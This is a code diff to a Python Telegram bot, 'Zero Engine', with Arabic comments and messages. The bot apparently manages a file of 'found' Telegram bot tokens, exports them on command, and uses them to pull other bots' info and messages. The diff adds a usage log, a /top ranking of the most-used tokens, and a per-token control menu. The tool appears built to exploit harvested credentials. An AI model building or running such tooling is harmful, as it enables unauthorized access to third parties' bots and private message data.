@@ -11,8 +11,14 @@ from controller import get_bot_info, get_bot_messages
 BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
 CHAT_ID = os.getenv('CHAT_ID')
 FOUND_FILE = "found.txt"
+STATS_FILE = "stats.txt" # سيتم إنشاؤه تلقائياً
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# --- نظام الترتيب ---
+def update_stats(token):
+    with open(STATS_FILE, "a") as f:
+        f.write(token + "\n")
 
 # --- نظام الكيبورد التفاعلي ---
 def get_markup(token):
@@ -29,6 +35,18 @@ def handle_text(message):
         return
     if message.text == "/start":
         bot.reply_to(message, "Zero Engine: البوت يعمل بكامل طاقته. أنتظر صيداً جديداً...")
+    elif message.text == "/top":
+        if not os.path.exists(STATS_FILE):
+            bot.reply_to(message, "⚠️ لا توجد بيانات إحصائية بعد.")
+            return
+        with open(STATS_FILE, "r") as f:
+            data = f.read().splitlines()
+        unique = list(set(data))
+        sorted_list = sorted([(t, data.count(t)) for t in unique], key=lambda x: x[1], reverse=True)
+        markup = types.InlineKeyboardMarkup()
+        for token, count in sorted_list[:10]:
+            markup.add(types.InlineKeyboardButton(f"بوت {token[:10]} ({count})", callback_data=f"menu|{token}"))
+        bot.reply_to(message, "📊 ترتيب البوتات (الأكثر استخداماً):", reply_markup=markup)
     elif message.text == "/get_tokens":
         if os.path.exists(FOUND_FILE) and os.path.getsize(FOUND_FILE) > 0:
             with open(FOUND_FILE, "rb") as f:
@@ -41,6 +59,13 @@ def handle_text(message):
 def callback_query(call):
     if str(call.message.chat.id) != str(CHAT_ID):
         return
+    
+    # قائمة التحكم الفرعية
+    if call.data.startswith("menu|"):
+        token = call.data.split("|")[1]
+        bot.edit_message_text(f"⚙️ تحكم في البوت: `{token[:10]}...`", call.message.chat.id, call.message.message_id, reply_markup=get_markup(token), parse_mode="Markdown")
+        return
+        
     if call.data == "export":
         if os.path.exists(FOUND_FILE):
             with open(FOUND_FILE, "rb") as f:
@@ -48,6 +73,7 @@ def callback_query(call):
         return
     try:
         action, token = call.data.split("|")
+        update_stats(token) # تحديث الترتيب
         res = get_bot_info(token) if action == "info" else get_bot_messages(token)
         bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
     except Exception as e:
